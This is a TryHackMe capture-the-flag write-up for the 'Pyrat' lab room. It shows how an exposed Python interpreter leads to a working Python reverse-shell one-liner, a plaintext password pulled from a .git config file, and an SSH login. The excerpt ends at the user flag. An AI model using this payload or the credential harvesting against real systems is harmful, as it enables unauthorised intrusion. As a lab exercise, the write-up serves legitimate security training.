# Pyrat - TryHackMe Writeup

## CTF Context

Pyrat receives a curious response from a server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to root.

---

## Step 1: Reconnaissance

First, I run a port scan with the following command:

```bash
nmap -Pn -sV 10.64.189.210
```

The results show 2 open ports:

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```

Since I don't have SSH credentials yet, I will try connecting to port 8000 using Netcat.

---

## Step 2: Establish Connection

```bash
nc -v 10.64.189.210 8000
```

```
10.64.189.210: inverse host lookup failed: Unknown host
(UNKNOWN) [10.64.189.210] 8000 (?) open
```

Once inside Netcat, I try running Linux commands like `whoami`, but it returns:

```
name 'whoami' is not defined
```

Since we are inside a Python interpreter, I will try executing Python code to see if I get a response:

```python
print("test")
```

```
test
```

The test was successful. Since the interpreter is running inside an Ubuntu server, I will try running Linux commands through the `os` library to check which user I am:

```python
import os; print(os.getuid())
```

```
33
```

---

## Step 4: Reverse Shell

It appears we are inside a web server. I will try to create a reverse shell for a more comfortable working environment.

First, I set my machine to listen:

```bash
nc -lvnp 443
```

```
listening on [any] 443 ...
```

Then I send the payload:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.64.189.210",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
```

I now have access to the shell:

```
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.140.193] from (UNKNOWN) [10.64.189.210] 46
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/root
```

After navigating through the directories from the root, I found a folder at `/opt/dev`. It didn't appear to contain anything at first glance, so I used `ls -la`:

```bash
ls -la
```

```
total 12
drwxrwxr-x 3 think think 4096 Jun 21  2023 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Jun 21  2023 .git
```

After entering the folder, there was a file called `config`, which revealed the credentials for user `think`:

```bash
cat config
```

```
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_
```

---

## Step 5: SSH Login

Now that I have the credentials, I log in via SSH as `think`:

```bash
ssh think@<IP>
```

```
think@ip-10-64-189-210:~$ ls
snap  user.txt
```
